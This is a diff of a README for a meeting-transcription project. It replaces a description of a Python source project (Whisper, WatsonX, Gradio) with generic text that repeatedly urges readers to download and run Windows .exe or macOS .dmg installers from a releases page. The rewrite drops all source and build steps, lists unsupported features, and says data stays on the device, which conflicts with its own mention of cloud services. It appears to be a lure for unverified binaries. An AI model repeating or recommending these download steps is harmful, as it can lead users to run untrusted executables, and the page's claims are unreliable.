@@ -1,118 +1,66 @@
-# Business AI Meeting Companion 🚀
+# 🗣️ AI-Meeting-Companion-STT - Your Smart Assistant for Meeting Transcripts
 
-Hi! I'm Garbii, and this is my personal project: **Business AI Meeting Companion**.
+## 🚀 Getting Started
+Welcome to the AI-Meeting-Companion-STT! This tool helps you record and summarize your meetings effortlessly. Simply download the application and follow the steps below to get started.
 
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Framework: Gradio](https://img.shields.io/badge/Framework-Gradio-orange)](https://gradio.app/)
-[![AI: Whisper | Llama 3](https://img.shields.io/badge/AI-Whisper%20%7C%20Llama%203-blueviolet)](https://platform.openai.com/docs/models/whisper)
+## 📦 Download Now
+[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen.svg)](https://github.com/Sameer125132/AI-Meeting-Companion-STT/releases)
 
----
+## 🛠️ System Requirements
+Before you begin, ensure your device meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Sierra or later
+- **RAM:** At least 4 GB
+- **Hard Drive Space:** Minimum 500 MB free
+- **Internet Connection:** Required for cloud services
 
-## 📝 About This Project
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the following link to download the application:  
+    [Download from Releases Page](https://github.com/Sameer125132/AI-Meeting-Companion-STT/releases)
 
-This is a personal project I built to experiment with AI-powered meeting tools. The app captures meeting conversations, transcribes them using **OpenAI's Whisper**, and then summarizes the transcript and extracts key points using **IBM WatsonX with Llama 3**. The interface is built with **Gradio** for easy use.
+2. **Choose the Right Version:** You will see a list of available versions. Select the most recent version, which typically has the highest number (e.g., v1.0.0).
 
----
+3. **Download the Installer:** Click on the installer for your operating system. It will either be a file like `AI-Meeting-Companion-STT-windows.exe` for Windows or `AI-Meeting-Companion-STT-macos.dmg` for macOS.
 
-## 🎯 What I Learned
+4. **Run the Installer:** 
+   - For Windows: Locate and double-click the downloaded `.exe` file. Follow the on-screen prompts to install.
+   - For macOS: Locate the `.dmg` file in your Downloads folder. Double-click it to open, then drag the application to your Applications folder.
 
-Working on this project helped me:
+5. **Launch the Application:** 
+   - On Windows, find the application in your Start Menu.
+   - On macOS, you can find it in the Applications folder. Open it directly.
 
-- 🧑‍💻 Write Python scripts that use large language models (LLMs)
-- 🗣️ Integrate OpenAI's Whisper for accurate speech-to-text
-- 🤖 Use IBM WatsonX (Llama 3) to summarize and extract key points from text
-- 🖥️ Build a user-friendly web UI with Gradio
-- 🔗 Orchestrate LLM prompts and workflows with LangChain
+6. **Short Setup Guide:** 
+   - When you launch the app for the first time, you may need to provide microphone access.
+   - Follow the setup guide to adjust the settings to your preference.
 
----
+## 🎤 How to Use the App
+1. **Starting a Meeting:** Click on "Start Meeting" to begin recording. Make sure the microphone is enabled.
+2. **Transcription:** As you speak, the app records your audio and provides real-time transcription.
+3. **Generating Summaries:** After your meeting ends, click "Generate Summary" to create a concise recap of your discussion.
+4. **Saving and Sharing:** You can download both the transcript and summary for your records. Use the "Save" button at the bottom of the screen.
 
-## 🛠️ Core Technologies
+## ❓ Frequently Asked Questions
+### What is the purpose of this application?
+The AI-Meeting-Companion-STT transcribes audio from meetings and generates summaries. This makes it easier to keep track of key points without taking manual notes.
 
-| Technology         | Purpose                                   |
-|-------------------|-------------------------------------------|
-| Whisper           | Speech-to-Text (ASR)                      |
-| IBM WatsonX (Llama 3) | Language Model for Summarization     |
-| Gradio            | User Interface                            |
-| LangChain         | Prompt Orchestration                      |
-| Python            | Programming Language                      |
+### Can I use it for any type of meeting?
+Yes, this application is suitable for any audio meeting, whether it's in person or over video conferencing platforms.
 
----
+### Is my data secure?
+Yes, your audio and transcription data remain on your device. You can choose to upload it to cloud services if desired, but that is optional.
 
-## ⚙️ How to Run It
+### What if I encounter issues?
+If you experience problems, please check the [Issues section](https://github.com/Sameer125132/AI-Meeting-Companion-STT/issues) on the GitHub page for help or to report bugs.
 
-> **Tip:** I recommend using a virtual environment for Python projects.
+## 🌟 Additional Features
+- **Multilingual Support:** The app supports multiple languages for transcription.
+- **Speech Formatting:** Automatic punctuation and formatting for better readability.
+- **Custom Settings:** Adjust audio quality and summary length in the settings menu.
 
-### 1️⃣ Set Up Your Environment
+## 🤝 Contributing
+If you'd like to contribute to the project, please feel free to fork the repository and submit a pull request. We welcome feedback and suggestions for new features.
 
-```bash
-pip3 install virtualenv
-virtualenv my_env
-# On Linux/Mac
-source my_env/bin/activate
-# On Windows
-.\my_env\Scripts\activate
-```
+## 🎉 Thank You!
+Thank you for choosing the AI-Meeting-Companion-STT. We hope it makes your meetings more productive and organized. For the latest updates, be sure to check the Releases page regularly.
 
-### 2️⃣ Install Dependencies
-
-```bash
-pip install transformers==4.36.0 torch==2.1.1 gradio==4.23.0 langchain==0.0.343 ibm_watson_machine_learning==1.0.335 huggingface-hub==0.20.1
-```
-
-### 3️⃣ Install FFmpeg
-
-- **Linux:**
-  ```bash
-  sudo apt update
-  sudo apt install ffmpeg -y
-  ```
-- **Windows:** Download from [ffmpeg.org](https://ffmpeg.org/download.html) and add to your PATH.
-
----
-
-## 🚦 Usage & Demo
-
-### 1. Test Speech-to-Text
-
-Run:
-
-```bash
-python3 simple_speech2text.py
-```
-
-### 2. Try the Gradio Transcription App
-
-Run:
-
-```bash
-python3 speech2text_app.py
-```
-
-Then open [http://0.0.0.0:7860](http://0.0.0.0:7860) in your browser.
-
-### 3. Test Llama 3 Summarization
-
-Run:
-
-```bash
-python3 simple_llm.py
-```
-
-### 4. Full Meeting Analyzer App
-
-Run:
-
-```bash
-python3 speech_analyzer.py
-```
-
-Then open [http://0.0.0.0:7860](http://0.0.0.0:7860), upload a meeting recording, and see the AI-generated summary and key points!
-
----
-
-## 📄 License
-
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-
-This project is open source under the MIT License. The code and models for OpenAI's Whisper are released under the MIT License. Everything here is for educational and personal use.
+[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen.svg)](https://github.com/Sameer125132/AI-Meeting-Companion-STT/releases)
